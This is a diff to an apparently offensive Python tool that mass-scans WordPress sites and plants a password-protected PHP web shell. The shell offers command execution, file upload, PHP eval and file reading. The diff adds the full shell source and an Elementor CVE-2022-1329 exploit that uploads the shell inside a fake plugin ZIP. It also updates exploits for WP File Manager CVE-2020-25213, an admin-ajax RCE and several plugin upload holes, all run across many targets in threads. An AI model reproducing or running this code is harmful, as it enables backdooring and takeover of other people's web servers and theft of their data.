@@ -10,6 +10,8 @@ from urllib.parse import urljoin, urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib3
 import threading
+import zipfile
+import tempfile
 
 RED = "\033[91m"
 GREEN = "\033[92m"
@@ -87,31 +89,158 @@ WP_VULN_PLUGINS = [
     {'name': 'wp-file-manager-old', 'path': 'wp-content/plugins/wp-file-manager/lib/php/connector.php', 'keywords': ['errUnknownCmd', 'json', 'currentFolder']},
     {'name': 'ajax-search-pro', 'path': 'wp-content/plugins/ajax-search-pro/js/file_upload.php', 'keywords': ['0', 'error', 'upload']},
     {'name': 'revslider', 'path': 'wp-content/plugins/revslider/temp/update_extract/revslider/update.php', 'keywords': ['revslider', 'update', 'failed']},
+    {'name': 'elementor', 'path': 'wp-content/plugins/elementor/core/app/modules/onboarding/module.php', 'keywords': ['elementor_upload_and_install_pro', 'nonce', 'ajax']},
 ]
 
+# Actual PHP Shell Code
 SHELL_PASSWORD = "aezeron"
-SHELL_CONTENT = """<?php
-$pass = "aezeron";
-if(isset($_REQUEST['p']) && $_REQUEST['p']==$pass){
-    echo "Aezeron Shell Active";
-    if(isset($_REQUEST['cmd'])){
-        echo "<pre>";
-        system($_REQUEST['cmd']);
-        echo "</pre>";
-        die;
-    }
-    if(isset($_FILES['f'])){
-        if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
-            echo "Upload Success";
-        }
-    }
+ACTUAL_PHP_SHELL = f"""<?php
+/**
+ * Aezeron Web Shell
+ * Password protected shell for authorized access only
+ */
+
+$pass = "{SHELL_PASSWORD}";
+
+// Password protection
+if(!isset($_REQUEST['p']) || $_REQUEST['p'] !== $pass) {{
+    die("Access Denied - Invalid Password");
+}}
+
+// Command execution
+if(isset($_REQUEST['cmd'])) {{
+    echo "<pre style='background:#000;color:#0f0;padding:10px;'>";
+    echo "Command: " . htmlspecialchars($_REQUEST['cmd']) . "\\n";
+    echo "Output:\\n";
+    echo "=" . str_repeat("=", 50) . "\\n";
+    system($_REQUEST['cmd']);
+    echo "\\n" . "=" . str_repeat("=", 50) . "\\n";
+    echo "</pre>";
     die;
-}
-if(isset($_POST['code'])){
+}}
+
+// File upload
+if(isset($_FILES['f'])) {{
+    $target = $_FILES['f']['name'];
+    if(move_uploaded_file($_FILES['f']['tmp_name'], $target)) {{
+        echo "File uploaded successfully: " . htmlspecialchars($target);
+    }} else {{
+        echo "Upload failed!";
+    }}
+    die;
+}}
+
+// Code execution via POST
+if(isset($_POST['code'])) {{
     eval($_POST['code']);
     die;
-}
-echo "WordPress Shell by Exploiter";
+}}
+
+// File manager
+if(isset($_GET['file'])) {{
+    $file = $_GET['file'];
+    if(file_exists($file)) {{
+        header('Content-Type: text/plain');
+        readfile($file);
+    }} else {{
+        echo "File not found: " . htmlspecialchars($file);
+    }}
+    die;
+}}
+
+// Directory listing
+if(isset($_GET['dir'])) {{
+    $dir = $_GET['dir'];
+    if(is_dir($dir)) {{
+        $files = scandir($dir);
+        echo "<pre>";
+        foreach($files as $file) {{
+            echo htmlspecialchars($file) . "\\n";
+        }}
+        echo "</pre>";
+    }} else {{
+        echo "Directory not found: " . htmlspecialchars($dir);
+    }}
+    die;
+}}
+
+// Shell interface
+echo "<!DOCTYPE html>
+<html>
+<head>
+    <title>Aezeron Web Shell</title>
+    <style>
+        body {{ background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }}
+        input, textarea {{ background: #2a2a2a; color: #0f0; border: 1px solid #0f0; padding: 5px; margin: 5px; }}
+        input[type=submit] {{ background: #0f0; color: #000; cursor: pointer; }}
+        .section {{ border: 1px solid #0f0; margin: 10px 0; padding: 10px; }}
+        h2 {{ color: #0f0; margin: 0 0 10px 0; }}
+    </style>
+</head>
+<body>
+    <h1>Aezeron Web Shell</h1>
+    <div class='section'>
+        <h2>Command Execution</h2>
+        <form method='get'>
+            <input type='hidden' name='p' value='{SHELL_PASSWORD}'>
+            <input type='text' name='cmd' size='60' placeholder='Enter command...'>
+            <input type='submit' value='Execute'>
+        </form>
+    </div>
+    <div class='section'>
+        <h2>File Upload</h2>
+        <form method='post' enctype='multipart/form-data'>
+            <input type='hidden' name='p' value='{SHELL_PASSWORD}'>
+            <input type='file' name='f'>
+            <input type='submit' value='Upload'>
+        </form>
+    </div>
+    <div class='section'>
+        <h2>PHP Code Execution</h2>
+        <form method='post'>
+            <input type='hidden' name='p' value='{SHELL_PASSWORD}'>
+            <textarea name='code' rows='5' cols='60' placeholder='Enter PHP code...'></textarea><br>
+            <input type='submit' value='Execute'>
+        </form>
+    </div>
+    <div class='section'>
+        <h2>File Viewer</h2>
+        <form method='get'>
+            <input type='hidden' name='p' value='{SHELL_PASSWORD}'>
+            <input type='text' name='file' size='60' placeholder='/etc/passwd or path/to/file'>
+            <input type='submit' value='View'>
+        </form>
+    </div>
+    <div class='section'>
+        <h2>Directory Listing</h2>
+        <form method='get'>
+            <input type='hidden' name='p' value='{SHELL_PASSWORD}'>
+            <input type='text' name='dir' size='60' placeholder='/var/www/html'>
+            <input type='submit' value='List'>
+        </form>
+    </div>
+    <div class='section'>
+        <h2>System Info</h2>
+        <pre>
+PHP Version: <?php echo phpversion(); ?>
+Server OS: <?php echo PHP_OS; ?>
+User: <?php echo get_current_user(); ?>
+CWD: <?php echo getcwd(); ?>
+        </pre>
+    </div>
+</body>
+</html>";
+?>"""
+
+# Simpler shell for uploads
+SIMPLE_SHELL = f"""<?php
+$p = "{SHELL_PASSWORD}";
+if(isset($_REQUEST['p']) && $_REQUEST['p']===$p){{
+    if(isset($_REQUEST['cmd'])){{ system($_REQUEST['cmd']); die; }}
+    if(isset($_FILES['f'])){{ move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); die; }}
+    if(isset($_POST['code'])){{ eval($_POST['code']); die; }}
+}}
+echo "Aezeron Shell - Password required";
 ?>"""
 
 class WPFileManagerExploit:
@@ -126,7 +255,8 @@ class WPFileManagerExploit:
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
         })
-        self.cookies = {}
+        self.cookies = {'wordpress_test_cookie': 'WP+Cookie+check'}
+        self.logged_in = False
 
     def _random_ip(self):
         return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
@@ -134,6 +264,9 @@ class WPFileManagerExploit:
     def is_shell(self, content):
         if not content:
             return False
+        # Check for our shell first
+        if SHELL_PASSWORD in content and ("Aezeron" in content or "system" in content):
+            return True
         for pattern in SHELL_REGEX_PATTERNS:
             if re.search(pattern, content, re.IGNORECASE):
                 return True
@@ -160,10 +293,26 @@ class WPFileManagerExploit:
             if any(x in content_lower for x in negative_keywords):
                 return False
 
+            # Check for our shell with password
             check_url = f"{url}?p={SHELL_PASSWORD}"
-            resp_pass = self.session.get(check_url, timeout=5)
-            if resp_pass.status_code == 200 and "Aezeron Shell Active" in resp_pass.text:
-                return True
+            try:
+                resp_pass = self.session.get(check_url, timeout=5)
+                if resp_pass.status_code == 200:
+                    if "Aezeron" in resp_pass.text or "Aezeron Web Shell" in resp_pass.text:
+                        return True
+                    if "Command:" in resp_pass.text and "system" in resp_pass.text.lower():
+                        return True
+            except:
+                pass
+
+            # Check for simple shell
+            test_cmd_url = f"{url}?p={SHELL_PASSWORD}&cmd=echo%20test"
+            try:
+                resp_cmd = self.session.get(test_cmd_url, timeout=5)
+                if resp_cmd.status_code == 200 and "test" in resp_cmd.text:
+                    return True
+            except:
+                pass
 
             has_shell_title = False
             title_match = re.search(r'<title>(.*?)</title>', content, re.IGNORECASE)
@@ -217,12 +366,12 @@ class WPFileManagerExploit:
             shell_name = f"sh_{random.randint(1000,9999)}.php"
             
             headers = {'User-Agent': 'Mozilla/5.0'}
-            resp = self.session.put(urljoin(url, shell_name), data=SHELL_CONTENT, headers=headers, timeout=10)
+            resp = self.session.put(urljoin(url, shell_name), data=SIMPLE_SHELL, headers=headers, timeout=10)
             if resp.status_code in [200, 201, 204]:
                 if self.verify_shell(urljoin(url, shell_name)):
                     return True, urljoin(url, shell_name)
             
-            files = {'file': (shell_name, SHELL_CONTENT, 'application/x-php')}
+            files = {'file': (shell_name, SIMPLE_SHELL, 'application/x-php')}
             resp = self.session.post(url, files=files, timeout=10)
             if resp.status_code == 200:
                  if self.verify_shell(urljoin(url, shell_name)):
@@ -231,23 +380,152 @@ class WPFileManagerExploit:
             pass
         return False, None
     
+    def create_elementor_payload_zip(self, shell_content=None, zip_name=None):
+        """
+        Create a ZIP file with the correct structure for Elementor exploit
+        Structure: elementor-pro/elementor-pro.php
+        """
+        if zip_name is None:
+            zip_name = tempfile.mktemp(suffix='.zip')
+        
+        if shell_content is None:
+            shell_content = SIMPLE_SHELL
+        
+        # Create the ZIP with correct structure
+        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            # Add elementor-pro.php inside elementor-pro folder
+            zipf.writestr('elementor-pro/elementor-pro.php', shell_content)
+        
+        return zip_name
+    
+    def elementor_login(self, target_url, username, password):
+        """
+        Login to WordPress to get nonce for Elementor exploit
+        """
+        print(f"    {CYAN}[*]{RESET} Attempting to login as: {username}")
+        
+        login_url = urljoin(target_url, 'wp-login.php')
+        admin_url = urljoin(target_url, 'wp-admin/')
+        
+        data = {
+            'log': username,
+            'pwd': password,
+            'wp-submit': 'Login',
+            'redirect_to': admin_url,
+            'testcookie': '1'
+        }
+        
+        try:
+            response = self.session.post(login_url, data=data, timeout=10)
+            
+            # Search for nonce in the response
+            # Pattern: "ajax":{"url":"http:\/\/baseUrl\/wp-admin\/admin-ajax.php","nonce":"4e8878bdba"}
+            nonce_pattern = re.compile(r'"ajax":\{"url":".+admin-ajax\.php","nonce":"([^"]+)"\}')
+            search = nonce_pattern.search(response.text)
+            
+            if search:
+                nonce = search.group(1)
+                print(f"    {GREEN}[+]{RESET} Login successful! Nonce found: {nonce}")
+                self.logged_in = True
+                return nonce
+            else:
+                print(f"    {RED}[-]{RESET} Login failed or nonce not found")
+                return None
+                
+        except Exception as e:
+            print(f"    {RED}[-]{RESET} Login error: {str(e)}")
+            return None
+    
+    def exploit_elementor(self, target_url, username, password, auto_shell=True):
+        """
+        CVE-2022-1329: Elementor 3.6.0/1/2 Remote Code Execution
+        Exploit by AkuCyberSec
+        Uploads actual PHP shell directly
+        """
+        print(f"\n  {CYAN}[*]{RESET} Testing Elementor RCE (CVE-2022-1329)...")
+        
+        # Check if Elementor is installed
+        elementor_path = urljoin(target_url, 'wp-content/plugins/elementor/readme.txt')
+        try:
+            check = self.session.get(elementor_path, timeout=5)
+            if check.status_code != 200:
+                print(f"    {YELLOW}[!]{RESET} Elementor plugin not detected")
+                return False, "Elementor not installed"
+        except:
+            print(f"    {YELLOW}[!]{RESET} Elementor plugin not detected")
+            return False, "Elementor not installed"
+        
+        # Login to get nonce
+        nonce = self.elementor_login(target_url, username, password)
+        if not nonce:
+            return False, "Login failed - cannot proceed with Elementor exploit"
+        
+        if not auto_shell:
+            return True, f"Elementor vulnerable, nonce obtained: {nonce}"
+        
+        # Create payload zip with actual PHP shell
+        print(f"    {CYAN}[*]{RESET} Creating Elementor payload ZIP with actual shell...")
+        zip_path = self.create_elementor_payload_zip(ACTUAL_PHP_SHELL)
+        
+        try:
+            # Upload the payload
+            upload_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
+            data = {
+                'action': 'elementor_upload_and_install_pro',
+                '_nonce': nonce
+            }
+            files = {
+                'fileToUpload': (os.path.basename(zip_path), open(zip_path, 'rb'), 'application/zip')
+            }
+            
+            print(f"    {CYAN}[*]{RESET} Uploading payload...")
+            response = self.session.post(upload_url, data=data, files=files, timeout=30)
+            
+            # Clean up temp file
+            os.remove(zip_path)
+            
+            # Check if upload was successful
+            if '"elementorProInstalled":true' in response.text:
+                print(f"    {GREEN}[+]{RESET} Payload uploaded successfully!")
+                
+                # The shell is now activated as a plugin
+                # Check if our shell is accessible
+                shell_url = urljoin(target_url, 'wp-content/plugins/elementor-pro/elementor-pro.php')
+                
+                time.sleep(2)  # Wait for activation
+                
+                if self.verify_shell(shell_url):
+                    print(f"    {GREEN}[SHELL]{RESET} Elementor shell active: {shell_url}?p={SHELL_PASSWORD}")
+                    return True, f"Elementor Shell: {shell_url}?p={SHELL_PASSWORD}"
+                else:
+                    print(f"    {YELLOW}[!]{RESET} Payload uploaded but shell verification failed")
+                    print(f"    {YELLOW}[!]{RESET} Try accessing: {shell_url}?p={SHELL_PASSWORD}")
+                    return True, f"Elementor payload uploaded (verify manually): {shell_url}?p={SHELL_PASSWORD}"
+            else:
+                print(f"    {RED}[-]{RESET} Upload failed")
+                print(f"    {YELLOW}[!]{RESET} Response: {response.text[:200]}")
+                return False, "Elementor upload failed"
+                
+        except Exception as e:
+            if os.path.exists(zip_path):
+                os.remove(zip_path)
+            print(f"    {RED}[-]{RESET} Elementor exploit error: {str(e)}")
+            return False, f"Error: {str(e)}"
+    
     def exploit_admin_ajax_rce(self, target_url, nonce=None, cookies=None):
         """
         Exploit for admin-ajax.php RCE via saveMappedFields action
-        Creates PHP file on target server
+        Uploads actual PHP shell directly
         """
         print(f"\n  {CYAN}[*]{RESET} Testing admin-ajax.php RCE exploit...")
         
         ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
-        shell_name = f"Nx_{random.randint(1000, 9999)}.php"
+        shell_name = f"Aezeron_{random.randint(1000, 9999)}.php"
         
-        # Payload that writes a PHP file
-        php_payload = f"<?php file_put_contents('{shell_name}','<?php $pass=\\\"aezeron\\\"; if(isset(\\$_REQUEST[\\'p\\']) && \\$_REQUEST[\\'p\\']==$pass){{ if(isset(\\$_REQUEST[\\'cmd\\'])){{ echo \\\"<pre>\\\"; system(\\$_REQUEST[\\'cmd\\']); echo \\\"</pre>\\\"; die; }} }} echo \\\"Shell Active\\\"; ?>'); ?>"
+        # Use actual PHP shell as the payload (no file_put_contents wrapper)
+        php_payload = ACTUAL_PHP_SHELL
         
-        # Alternative simpler payload
-        simple_payload = f"<?php file_put_contents('{shell_name}','<?php system(\\$_REQUEST[\\'cmd\\']); ?>'); ?>"
-        
-        # MappedFields JSON structure
+        # MappedFields JSON structure with actual shell code
         mapped_fields = {
             "pwn->cus2": php_payload
         }
@@ -276,25 +554,26 @@ class WPFileManagerExploit:
             if response.status_code == 200:
                 print(f"    {GREEN}[+]{RESET} Request successful (Status: {response.status_code})")
                 
-                # Check if shell was created
-                shell_url = urljoin(target_url, shell_name)
-                print(f"    {CYAN}[*]{RESET} Checking for shell at: {shell_url}")
+                # The shell should be written directly to the webroot
+                # Try multiple possible locations
+                possible_paths = [
+                    urljoin(target_url, shell_name),
+                    urljoin(target_url, f'wp-content/{shell_name}'),
+                    urljoin(target_url, f'wp-content/uploads/{shell_name}'),
+                    urljoin(target_url, f'wp-admin/{shell_name}'),
+                ]
                 
-                time.sleep(2)  # Wait for file to be written
-                
-                if self.verify_shell(shell_url):
-                    print(f"    {GREEN}[SHELL]{RESET} Shell successfully created: {shell_url}?p={SHELL_PASSWORD}")
-                    return True, f"admin-ajax RCE Shell: {shell_url}?p={SHELL_PASSWORD}"
-                else:
-                    # Try alternative shell location
-                    alt_shell_url = urljoin(target_url, f'wp-content/{shell_name}')
-                    if self.verify_shell(alt_shell_url):
-                        print(f"    {GREEN}[SHELL]{RESET} Shell found in wp-content: {alt_shell_url}?p={SHELL_PASSWORD}")
-                        return True, f"admin-ajax RCE Shell: {alt_shell_url}?p={SHELL_PASSWORD}"
+                for shell_url in possible_paths:
+                    print(f"    {CYAN}[*]{RESET} Checking for shell at: {shell_url}")
+                    time.sleep(1)
                     
-                    print(f"    {YELLOW}[!]{RESET} Shell not found, but request was processed")
-                    print(f"    {YELLOW}[!]{RESET} Response preview: {response.text[:200]}")
-                    return False, "Shell created but verification failed"
+                    if self.verify_shell(shell_url):
+                        print(f"    {GREEN}[SHELL]{RESET} Shell successfully created: {shell_url}?p={SHELL_PASSWORD}")
+                        return True, f"admin-ajax RCE Shell: {shell_url}?p={SHELL_PASSWORD}"
+                
+                print(f"    {YELLOW}[!]{RESET} Shell not found in common locations")
+                print(f"    {YELLOW}[!]{RESET} Response preview: {response.text[:200]}")
+                return False, "Shell created but verification failed"
             else:
                 print(f"    {RED}[-]{RESET} Request failed (Status: {response.status_code})")
                 return False, f"Request failed with status {response.status_code}"
@@ -412,7 +691,7 @@ class WPFileManagerExploit:
     def exploit_cve_2020_25213(self, target_url, auto_shell=True):
         """
         CVE-2020-25213: WP File Manager 6.0-6.8 Unauthenticated RCE
-        Original exploit by Mansoor R (@time4ster)
+        Uploads actual PHP shell directly
         """
         print(f"\n  {CYAN}[*]{RESET} Testing CVE-2020-25213 (WP File Manager RCE)...")
         
@@ -445,14 +724,14 @@ class WPFileManagerExploit:
         
         # If auto_shell, upload a shell using the exact exploit payload
         if auto_shell:
-            print(f"    {CYAN}[*]{RESET} Uploading shell via CVE-2020-25213...")
-            shell_name = f"cve_shell_{random.randint(1000, 9999)}.php"
+            print(f"    {CYAN}[*]{RESET} Uploading actual PHP shell via CVE-2020-25213...")
+            shell_name = f"aezeron_shell_{random.randint(1000, 9999)}.php"
             
-            # Create temporary file with shell content
-            temp_shell = f"/tmp/{shell_name}"
+            # Create temporary file with actual shell content
+            temp_shell = tempfile.mktemp(suffix='.php')
             try:
                 with open(temp_shell, 'w') as f:
-                    f.write(SHELL_CONTENT)
+                    f.write(SIMPLE_SHELL)
                 
                 # Exact payload from the bash exploit
                 files = {
@@ -503,8 +782,8 @@ class WPFileManagerExploit:
                 return False, "Exploit failed"
                 
             except Exception as e:
-                if os.path.exists(f"/tmp/{shell_name}"):
-                    os.remove(f"/tmp/{shell_name}")
+                if os.path.exists(temp_shell):
+                    os.remove(temp_shell)
                 print(f"    {RED}[-]{RESET} CVE-2020-25213 error: {str(e)}")
                 return False, f"Error: {str(e)}"
         
@@ -530,7 +809,7 @@ class WPFileManagerExploit:
                 
                 if check_response.status_code == 200:
                     files = {
-                        'upload[]': ('shell.php', SHELL_CONTENT, 'application/x-php')
+                        'upload[]': ('shell.php', SIMPLE_SHELL, 'application/x-php')
                     }
                     
                     data = {
@@ -578,7 +857,7 @@ class WPFileManagerExploit:
             
             if check_response.status_code == 200:
                 files = {
-                    'files[]': ('shell.php', SHELL_CONTENT, 'application/x-php')
+                    'files[]': ('shell.php', SIMPLE_SHELL, 'application/x-php')
                 }
                 
                 exploit_response = self.session.post(exploit_url, files=files, timeout=10)
@@ -613,7 +892,7 @@ class WPFileManagerExploit:
             shell_name = f'revshell{random.randint(1000, 9999)}.php'
             
             files = {
-                'update_file': (shell_name, SHELL_CONTENT, 'application/x-php')
+                'update_file': (shell_name, SIMPLE_SHELL, 'application/x-php')
             }
             
             data = {
@@ -651,7 +930,7 @@ class WPFileManagerExploit:
                     shell_name = f'upload_{random.randint(1000, 9999)}.php'
                     
                     files = {
-                        'file': (shell_name, SHELL_CONTENT, 'application/x-php'),
+                        'file': (shell_name, SIMPLE_SHELL, 'application/x-php'),
                     }
                     
                     upload_response = self.session.post(upload_url, files=files, timeout=10)
@@ -683,7 +962,7 @@ class WPFileManagerExploit:
             
             for param in params:
                 try:
-                    files = {param: (shell_name, SHELL_CONTENT, 'application/x-php')}
+                    files = {param: (shell_name, SIMPLE_SHELL, 'application/x-php')}
                     resp = self.session.post(target_url, files=files, timeout=10)
                     
                     if resp.status_code == 200:
@@ -774,7 +1053,7 @@ class WPFileManagerExploit:
         
         return writable_dirs, found_shells
     
-    def auto_exploit(self, target_url):
+    def auto_exploit(self, target_url, elementor_creds=None):
         results = {
             'file_manager': False,
             'ajax_search': False,
@@ -782,6 +1061,7 @@ class WPFileManagerExploit:
             'brute_upload': False,
             'cve_2020_25213': False,
             'admin_ajax_rce': False,
+            'elementor_rce': False,
             'shell_urls': [],
             'details': []
         }
@@ -792,6 +1072,22 @@ class WPFileManagerExploit:
             results['details'].append(f"Writable directories: {', '.join(writable_dirs)}")
         if found_shells:
             results['shell_urls'].extend(found_shells)
+        
+        # Test Elementor RCE if credentials provided
+        if elementor_creds and elementor_creds.get('username') and elementor_creds.get('password'):
+            print(f"{CYAN}[*]{RESET} Testing Elementor RCE (CVE-2022-1329)...")
+            elementor_result, elementor_msg = self.exploit_elementor(
+                target_url, 
+                elementor_creds['username'], 
+                elementor_creds['password'], 
+                auto_shell=True
+            )
+            results['elementor_rce'] = elementor_result
+            results['details'].append(f"[Elementor] {elementor_msg}")
+            if elementor_result and "Shell" in elementor_msg:
+                shell_part = elementor_msg.split(': ')[1] if ': ' in elementor_msg else elementor_msg
+                if shell_part not in results['shell_urls']:
+                    results['shell_urls'].append(shell_part)
         
         # Test admin-ajax.php RCE
         print(f"{CYAN}[*]{RESET} Testing admin-ajax.php RCE...")
@@ -849,7 +1145,7 @@ class WPFileManagerExploit:
             if shell_part not in results['shell_urls']:
                 results['shell_urls'].append(shell_part)
         
-        if not any([fm_result, ajax_result2, rev_result, brute_result, cve_result, ajax_result]):
+        if not any([fm_result, ajax_result2, rev_result, brute_result, cve_result, ajax_result, results['elementor_rce']]):
             results['details'].append("All exploit attempts failed")
         
         return results
@@ -934,7 +1230,7 @@ def check_wordpress_site(base_url):
     
     return False
 
-def scan_single_target(target_url, exploit=False):
+def scan_single_target(target_url, exploit=False, elementor_creds=None):
     result = {
         'url': target_url,
         'is_wordpress': False,
@@ -967,7 +1263,22 @@ def scan_single_target(target_url, exploit=False):
         if exploit:
             exploiter = WPFileManagerExploit()
             
-            # Try admin-ajax.php RCE first
+            # Try Elementor RCE if credentials provided
+            if elementor_creds and elementor_creds.get('username') and elementor_creds.get('password'):
+                print(f"{CYAN}[*]{RESET} Testing Elementor RCE (requires authentication)...")
+                elementor_success, elementor_msg = exploiter.exploit_elementor(
+                    target_url, 
+                    elementor_creds['username'], 
+                    elementor_creds['password'], 
+                    auto_shell=True
+                )
+                if elementor_success and "Shell" in elementor_msg:
+                    shell_url = elementor_msg.split(': ')[1] if ': ' in elementor_msg else elementor_msg
+                    if shell_url not in result['shell_urls']:
+                        result['shell_urls'].append(shell_url)
+                    print(f"  {GREEN}[SHELL]{RESET} {elementor_msg}")
+            
+            # Try admin-ajax.php RCE
             print(f"{CYAN}[*]{RESET} Testing admin-ajax.php RCE...")
             ajax_success, ajax_msg = exploiter.exploit_admin_ajax_auto(target_url)
             if ajax_success and "Shell" in ajax_msg:
@@ -1005,7 +1316,7 @@ def scan_single_target(target_url, exploit=False):
                             result['shell_urls'].append(shell_url)
                         print(f"  {GREEN}[SHELL]{RESET} {msg}")
             
-            exploit_result = exploiter.auto_exploit(target_url)
+            exploit_result = exploiter.auto_exploit(target_url, elementor_creds)
             result['exploit_results'] = exploit_result
             for shell in exploit_result.get('shell_urls', []):
                 if shell not in result['shell_urls']:
@@ -1013,7 +1324,7 @@ def scan_single_target(target_url, exploit=False):
     
     return result
 
-def mass_scan_targets(targets, max_workers=30, exploit=False):
+def mass_scan_targets(targets, max_workers=30, exploit=False, elementor_creds=None):
     results = []
     wp_sites = 0
     vulnerable_sites = 0
@@ -1025,10 +1336,11 @@ def mass_scan_targets(targets, max_workers=30, exploit=False):
     
     print(f"\n{BLUE}[*]{RESET} Starting WP Exploit Scanner for {CYAN}{total}{RESET} targets")
     if exploit:
-        print(f"{RED}[!]{RESET} AUTO EXPLOIT MODE ENABLED (CVE-2020-25213 + Admin Ajax RCE)")
+        print(f"{RED}[!]{RESET} AUTO EXPLOIT MODE ENABLED")
+        print(f"{RED}[!]{RESET} Exploits: CVE-2020-25213, Admin Ajax RCE, Elementor RCE (if creds provided)")
     
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        future_to_target = {executor.submit(scan_single_target, target, exploit): target for target in targets}
+        future_to_target = {executor.submit(scan_single_target, target, exploit, elementor_creds): target for target in targets}
         
         for future in as_completed(future_to_target):
             completed += 1
@@ -1106,7 +1418,7 @@ def save_results(results, filename="wp_exploit_results.txt"):
     try:
         with open(filename, 'w', encoding='utf-8') as f:
             f.write("=" * 100 + "\n")
-            f.write("WORDPRESS EXPLOIT SCANNER RESULTS (CVE-2020-25213 + Admin Ajax RCE)\n")
+            f.write("WORDPRESS EXPLOIT SCANNER RESULTS (Multiple CVEs)\n")
             f.write("=" * 100 + "\n\n")
             
             wp_count = len([r for r in results if r['is_wordpress']])
@@ -1159,7 +1471,8 @@ def main():
 ╚███╔███╔╝██║         ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
  ╚══╝╚══╝ ╚═╝         ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                             
-           FILE MANAGER EXPLOIT + ADMIN-AJAX RCE + CVE-2020-25213
+        MULTI-EXPLOIT SCANNER: File Manager + Admin Ajax + Elementor
+                    (Actual PHP Shell - No file_put_contents)
 {RESET}
 """
     
@@ -1187,14 +1500,27 @@ def main():
     exploit_input = input(f"{YELLOW}[?]{RESET} Enable auto exploit? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
     exploit = exploit_input == 'y'
     
+    # Elementor credentials (optional)
+    elementor_creds = None
+    if exploit:
+        print(f"\n{CYAN}[*]{RESET} Elementor RCE requires WordPress credentials")
+        use_elementor = input(f"{YELLOW}[?]{RESET} Attempt Elementor exploit? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
+        if use_elementor == 'y':
+            username = input(f"{YELLOW}[?]{RESET} WordPress username: ").strip()
+            password = input(f"{YELLOW}[?]{RESET} WordPress password: ").strip()
+            if username and password:
+                elementor_creds = {'username': username, 'password': password}
+    
     print(f"{BLUE}[*]{RESET} Starting scan with {CYAN}{max_workers}{RESET} threads...")
     if exploit:
-        print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED (Admin Ajax RCE + CVE-2020-25213)")
+        print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED")
+        if elementor_creds:
+            print(f"{GREEN}[+]{RESET} Elementor exploit will be attempted with provided credentials")
         print(f"{YELLOW}[!]{RESET} Use only on authorized targets")
     print(f"{YELLOW}[!]{RESET} Press Ctrl+C to stop")
     
     try:
-        results = mass_scan_targets(targets, max_workers, exploit)
+        results = mass_scan_targets(targets, max_workers, exploit, elementor_creds)
         
         if results:
             save_option = input(f"\n{YELLOW}[?]{RESET} Save results? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
